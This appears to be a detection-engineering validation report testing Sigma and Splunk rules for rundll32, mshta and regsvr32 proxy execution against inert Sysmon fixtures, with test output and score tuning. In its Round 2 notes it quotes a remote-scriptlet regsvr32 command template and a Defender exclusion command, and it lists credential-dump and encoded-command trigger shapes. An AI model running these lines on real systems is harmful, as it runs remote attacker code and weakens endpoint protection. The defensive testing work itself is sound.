# Validation — T1218 System Binary Proxy Execution (Rundll32 / Mshta / Regsvr32)

> **Rules**: `rule.yml` (Sigma base, `process_creation`) · `rule.spl` (Splunk, EID 1 + EID 3 correlated)
> **Test dates**: 2026-07-09 – 07-10 (manual trigger validation) · 2026-07-15 – 07-16 (Chainsaw batch) · 2026-07-19 (SPL)
> **Lab host**: LAB-WIN11-01 (Windows 11 22H2, synthetic hostname)
> **Emulation**: Custom Sysmon EID 1 EVTX fixture batch via Chainsaw. No Atomic Red Team — see the note at the end of Round 3.

---

## Pre-conditions

- Sysmon installed with process creation (EID 1) logged and **not** filtered out for rundll32/mshta/regsvr32/cmd/cscript, forwarding the `Microsoft-Windows-Sysmon/Operational` channel to Splunk.
- Fixtures generated on the lab host with [telemetry-generator_mal.ps1](telemetry-generator_mal.ps1) and [telemetry-generator-benign.ps1](telemetry-generator-benign.ps1). Each case spawns the target LOLBin with the exact command line / parent-child chain the matching Sigma selection keys on, exports the resulting EID 1 to its own EVTX slice (`{category}_{name}.evtx`), then kills the test process and cleans up. Real events, not hand-crafted XML.
- The generator must run **elevated** — it needs admin for the Sysmon Operational read and for `wevtutil epl`.
- `rule.yml` is a `process_creation` rule (Image / ParentImage / CommandLine), which on a Sysmon estate means **EID 1** — not the Security-log 4698/4699 the folder scaffold was originally cloned from. That mismatch cost an hour before it was spotted.

---

## Round 1 — Manual trigger validation (2026-07-09 to 07-10)

**Approach:** interactive triggering on a single Windows test box, cross-referencing each attempt against Sysmon EID 1 in Splunk (`ProcessGuid` / `ParentProcessGuid` chains) to confirm both the process creation and the specific command-line signal each Sigma selection targets.

**Confirmed:**

- `selection_script_html_abuse` end to end: `cmd.exe → rundll32.exe (url.dll,OpenURL) → msedge.exe` captured cleanly in Sysmon, validating the `url.dll,OpenURL` string match against real telemetry rather than against an assumption about the command-line format.
- The mshta child-spawn behaviour (`mshta.exe → calc.exe`) using a saved `.hta` rather than an inline command. This is the mechanism the "mshta spawning a shell/script host" logic is built around.
- `WScript.Shell` object creation is not blocked by WSH policy on this box (`cscript` + `.vbs` ran fine), ruling out a Windows Script Host GPO restriction as an environmental confound.
- The Splunk ingestion pipeline for Sysmon is unrestricted — no whitelist on the `Microsoft-Windows-Sysmon/Operational` input.

**What actually went wrong in this round.** Repeated "nothing executes" results were misattributed to AV, ASR and AppLocker/WDAC in turn, and all three were eventually ruled out. The real cause was character corruption: typing and pasting nested-quote command lines into `cmd.exe`/PowerShell triggered smart-quote substitution, and Notepad silently added a BOM to saved `.vbs` files, producing a VBScript compilation error (800A0408) rather than a clean block/deny signal. A policy block and a syntax error look identical from the outside if you only check whether the process appeared. The generators now write all payload files UTF-8 no-BOM for exactly this reason.

Also corrected here: a data-source mapping error carried in from the scaffold — Sysmon EID 10 is `ProcessAccess`, not `FileCreate` (`FileCreate` is EID 11). Relevant if EID 10 is ever pulled into this rule's correlation logic.

---

## Round 2 — Chainsaw fixture batch (Sigma rule)

Nine malicious and nine benign EID 1 slices, hunted with:

```
chainsaw hunt <dir> --sigma rule.yml --mapping tests\mappings\sigma-event-logs-all.yml --csv -o results.csv
```

Every trigger is **inert**: it lands the command-line / parent-child signal the rule keys on without executing a working attack — malformed ordinals, invalid PIDs, non-existent DLLs, no-op scriptlets, a reserved `*.invalid` host. Per-case safety notes are in the generator headers.

| MITRE TTP | Category | Name | Description |
|---|---|---|---|
| T1218.005 | Malicious | mal_mshta_clsid | mshta invoked with a bare COM CLSID `{GUID}` instead of a file path |
| T1218.005 | Malicious | mal_mshta_encoded | mshta command line carrying an embedded ` -enc` powershell token (no powershell spawned) |
| T1218.005 | Malicious | mal_mshta_frombase64string | mshta command line carrying a `FromBase64String` token (no decode) |
| T1218.010 | Malicious | mal_regsvr32_parent | regsvr32 spawned by a script host (`cscript` → `.vbs` → regsvr32 /s), parent-image signal |
| T1218.010 | Malicious | mal_regsvr32_squiblydoo | regsvr32 loading a **local** scriptlet (`scrobj.dll` + `.sct`), no network |
| T1218.010 | Malicious | mal_regsvr32_suspicious_url | regsvr32 loading a **remote** scriptlet URL (`/i:ftp` + `scrobj.dll` + `.sct`) |
| T1218.011 | Malicious | mal_rundll32_script_abuse | rundll32 proxying execution via the shell32 `ShellExec_RunDLL` export |
| T1218.011 | Malicious | mal_rundll32_credential_dumping | rundll32 referencing the comsvcs credential-dump export by ordinal + invalid PID (inert) |
| T1218.011 | Malicious | mal_rundll32_parent | `cmd → rundll32 \Users\Public\…dll,#1` — the parent + path-obfuscation pair |
| T1218.005 | Benign | benign_mshta_local_html | mshta opening a local, script-free `.hta`/`.html` by plain file path (self-closes) |
| T1218.005 | Benign | benign_mshta_signed_html | as above, second variant |
| T1218.005 | Benign | benign_mshta_system_html | as above, third variant |
| T1218.010 | Benign | benign_regsvr32_local_dll | regsvr32 `/s` registering a local vendor COM DLL from its own dir (no scrobj/URL, silent no-op) |
| T1218.010 | Benign | benign_regsvr32_signed_dll | regsvr32 `/s` on a signed system DLL (`user32.dll`) |
| T1218.010 | Benign | benign_regsvr32_system_dll | regsvr32 `/s` on a signed system DLL (`kernel32.dll`) |
| T1218.011 | Benign | benign_rundll32_local_dll | Control Panel routing via shell32 `Control_RunDLL` — the #1 legitimate rundll32 use |
| T1218.011 | Benign | benign_rundll32_signed_dll | rundll32 `advapi32.dll,ProcessIdleTasks` |
| T1218.011 | Benign | benign_rundll32_system_dll | rundll32 `user32.dll,UpdatePerUserSystemParameters` |

`mal_rundll32_parent` was dropped mid-build and then reinstated. Defender's behaviour monitor flags it as `Behavior:Win32/RunDllExec.SA`, which is not a content/AMSI block, so a path exclusion cannot suppress it — but the flag lands *after* process creation, and Sysmon has already written the EID 1 by then. The fixture generates fine; only a hard creation block loses the event (see the regsvr32 `/i:http` case below).

### AV / environmental notes

Free-tier Microsoft Defender, real-time and behaviour monitoring on throughout.

- An earlier generator revision was quarantined as `Backdoor:JS/Relvelshe.A` — a **static** signature on the `.ps1` text itself (it embedded runnable mshta→powershell→`-enc` one-liners and a scriptlet that shelled a payload), not a runtime block. The file was removed before it could run, and AMSI re-blocked the same command lines on execution. Rewriting every case to carry the command-line signal without a runnable payload clears the file scan, verified with `MpCmdRun.exe -Scan -ScanType 3 -File <ps1>` returning no threats.
- `regsvr32 /s /n /u /i:http://<host>/x.sct scrobj.dll` — the classic remote Squiblydoo — is hard-blocked by Defender **at process creation** ("Access is denied", reproduced 3/3), so it never yields an EID 1 at all while real-time protection is on. `mal_regsvr32_suspicious_url` therefore uses `/i:ftp://…`, which carries the same `squiblydoo_remote` signal (`/i:(http|ftp)`) and which Defender allows to spawn. The local `.sct` case covers the `scrobj.dll` / `.sct` tokens separately.
- Worth stating plainly because it shaped the whole fixture design: **Sysmon writes EID 1 at process creation, before Defender can kill a merely-flagged process.** A flagged-but-not-creation-blocked command line still produces a usable fixture. Only a hard creation block loses the event.

**Cloud-ML false positive (`Trojan:PowerShell/FakeCaptcha.Y!MTB`) — bisected 2026-07-15.**
Running the generator via `powershell.exe -File` (and ISE's F5, which auto-scans) intermittently tripped this ML/cloud verdict on the `.ps1` *content*, even though the static `MpCmdRun -Scan` was clean — local signatures pass, but AMSI submits the script text to the cloud at runtime and the classifier flagged it there. Bisection method: write a chunk of the script to a temp `.ps1`, run it with `-File` so AMSI scans the whole file at compile time, then watch `Get-MpThreatDetection`. Two embedded structures the ClickFix/FakeCaptcha family keys on were the cause:

- the benign mshta `.hta` template (`<hta:application …/>` plus `<script>window.close();</script>`) — the literal ClickFix delivery shape. **Fixed:** plain script-free HTML body. The rule keys on mshta's command line, not the `.hta` contents, so this is an identical test.
- the squiblydoo `.sct` scriptlet's embedded `<script language="JScript">` block. **Fixed:** registration-only scriptlet with no script body. EID 1 fires at regsvr32 creation regardless of whether scrobj ever loads the file.

If the generator still gets quarantined on a given box, exclude it for the duration of the run:

```powershell
Add-MpPreference -ExclusionPath 'detections\defence-evasion\T1218.005-System-Binary-Proxy-Execution\telemetry-generator_mal.ps1'
```

### Raw harness output

```
tests/test_detections.py::test_fixtures_present PASSED                   [  3%]
tests/test_detections.py::test_no_wiring_errors[NOTSET] SKIPPED (got...) [  6%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_installer_temp_task] PASSED [  9%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_privesc_runlevel_highest] PASSED [ 12%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_pscmdlet_encoded] PASSED [ 16%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_schtask_encoded_powershell] PASSED [ 19%]
tests/test_detections.py::test_fires_on_malicious[T1053.005-Scheduled-task-creation/malicious_mal_wmi_registerbyxml_temp_path] PASSED [ 22%]
tests/test_detections.py::test_fires_on_malicious[T1059.001-PowerShell-Execution/malicious] PASSED [ 25%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_mshta_clsid] PASSED [ 29%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_mshta_encoded] PASSED [ 32%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_mshta_frombase64string] PASSED [ 35%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_regsvr32_parent] PASSED [ 38%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_regsvr32_squiblydoo] PASSED [ 41%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_regsvr32_suspicious_url] PASSED [ 45%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_rundll32_credential_dumping] PASSED [ 48%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_rundll32_parent] PASSED [ 51%]
tests/test_detections.py::test_fires_on_malicious[T1218.005-System-Binary-Proxy-Execution/malicious_mal_rundll32_script_abuse] PASSED [ 54%]
tests/test_detections.py::test_quiet_on_benign[T1053.005-Scheduled-task-creation/benign_benign_clean_powershell_script] PASSED [ 58%]
tests/test_detections.py::test_quiet_on_benign[T1053.005-Scheduled-task-creation/benign_benign_signed_backup_task] PASSED [ 61%]
tests/test_detections.py::test_quiet_on_benign[T1053.005-Scheduled-task-creation/benign_benign_system_maintenance_task] PASSED [ 64%]
tests/test_detections.py::test_quiet_on_benign[T1053.005-Scheduled-task-creation/benign_benign_user_logon_notepad] PASSED [ 67%]
tests/test_detections.py::test_quiet_on_benign[T1059.001-PowerShell-Execution/benign] PASSED [ 70%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_mshta_local_html] PASSED [ 74%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_mshta_signed_html] PASSED [ 77%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_mshta_system_html] PASSED [ 80%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_regsvr32_local_dll] PASSED [ 83%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_regsvr32_signed_dll] PASSED [ 87%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_regsvr32_system_dll] PASSED [ 90%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_rundll32_local_dll] PASSED [ 93%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_rundll32_signed_dll] PASSED [ 96%]
tests/test_detections.py::test_quiet_on_benign[T1218.005-System-Binary-Proxy-Execution/benign_benign_rundll32_system_dll] PASSED [100%]
```

### Result

18/18 T1218 fixtures behaved as expected on the first run — 100% TP, 0% FP, no tuning iterations. That is a different shape of result to T1053.005, which needed three passes, and the reason is that this rule was written *after* the manual round: the command-line formats had already been confirmed against real Sysmon telemetry, so the string matches were right the first time. The difficulty in this technique is not writing selections that match, it is writing selections that do not also match the enormous benign rundll32 baseline, and a nine-case benign set only goes so far towards proving that.

With that confidence the rule was converted to SPL.

---

## Round 3 — SPL testing in Splunk (2026-07-19)

The same fixture set was replayed against `rule.spl` in Splunk, this time to check the *grading* rather than the matching.

**First pass.** Zero benign fixtures were surfaced at any severity, so no false positives. But most malicious fixtures graded only Informational, because under the original cuts (Critical ≥ 5, High 4, Medium 3, Informational 2) a command line carrying exactly one strong signal scores 2 and lands on the bottom tier.

Working the weights through by hand shows why six of the nine sat there:

| Fixture | Signals that score | Score | Original tier |
|---|---|---|---|
| mal_rundll32_credential_dumping | cred_dump 4 + path_obfuscation 1 + rundll_parent 1 | 6 | Critical |
| mal_regsvr32_suspicious_url | squiblydoo_remote 4 | 4 | High |
| mal_rundll32_script_abuse | rundll_script_abuse 2 + rundll_parent 1 | 3 | Medium |
| mal_rundll32_parent | rundll_parent 1 + path_obfuscation 1 | 2 | Informational |
| mal_mshta_clsid | mshta_clsid 2 | 2 | Informational |
| mal_mshta_encoded | mshta_cli 2 | 2 | Informational |
| mal_mshta_frombase64string | mshta_cli 2 | 2 | Informational |
| mal_regsvr32_parent | regsvr_parent 2 | 2 | Informational |
| mal_regsvr32_squiblydoo | squiblydoo_local 2 | 2 | Informational |

None of the fixtures produced an EID 3, so the +3 network bonus is untested by this batch — every score above is the process-creation half only.

**The change.** Informational is the right grade for a weak signal, but not for `mshta` invoked with a bare CLSID or `regsvr32` loading a local scriptlet. Those deserve a look from an analyst. So the Medium cut was lowered from `Score >= 3` to `Score >= 2`, which promotes the whole bottom block to Medium and leaves Critical and High where they were.

**Re-run.** Benign side unchanged, as expected: the benign fixtures score at most 1, so no tier cut at or above 2 can reach them. The firing floor (`where Score >= 2`) is doing that work, not the tier boundary — worth being clear about, because it means the safety margin here is one point, and dropping the floor to 1 for hunting would start surfacing benign rundll32 activity.

One side effect of the change: Informational is now unreachable in normal operation, since Score 1 is the only value that maps to it and the floor is 2. It was left in the `case` rather than deleted, so that lowering the floor to 1 gives a working hunting tier for free. The rule header documents this.

**Why no Atomic Red Team.** The ART T1218 tests are blocked by the EDR on this host at process creation, so they generate no telemetry to test the rule against — the same failure mode as the remote-Squiblydoo case in Round 2, but across the board. Since the block happens before Sysmon can log anything, running them would produce empty results rather than negative ones. The inert fixture set exists precisely because of this, and covers the same command-line shapes.

---

## Known gaps in this test set

- **`mshta_parent` has no fixture.** Both generators launch every case with `Start-Process` from PowerShell, so the parent is always `powershell.exe`. That is not in the `mshta_parent` list (outlook / winword / excel / powerpnt / chrome / msedge / firefox), so the signal never fires in the batch and is currently unproven. `regsvr_parent` is covered because `mal_regsvr32_parent` deliberately goes through `cscript`. An Office-spawns-mshta fixture is the obvious next addition.
- **The `powershell.exe` parent cuts the other way too.** It means `rundll_parent` fires on every rundll32 fixture, malicious and benign alike, which inflates the malicious scores by 1 and is why the benign rundll32 cases sit at 1 rather than 0. Both are artefacts of the harness, not of the rule.
- **The network half is untested.** No fixture produces an EID 3, so the `ProcessGuid` fold and the +3 bonus have been reasoned about but not observed. Testing it needs a trigger that actually connects out, which is exactly the thing the inert-fixture design avoids — probably a controlled connection to a local listener rather than anything external.
- **No screenshots** were captured for the SPL round.

---

## Outcome

- **Sigma base rule**: 18/18 on the fixture batch, first run, no tuning iterations.
- **Splunk rule**: 0 false positives across the benign set; malicious grading corrected from mostly-Informational to Medium and above by lowering the Medium cut to `Score >= 2`. Critical and High cuts unchanged.
- **Outstanding**: an mshta-from-Office fixture, and a network-connection fixture to exercise the EID 1 / EID 3 correlation.
- **Confirmed environmental blind spot**: with Defender real-time protection on, remote Squiblydoo over http is blocked at process creation and produces no EID 1 for any rule to read. That is a property of the endpoint, not a gap in the rule.
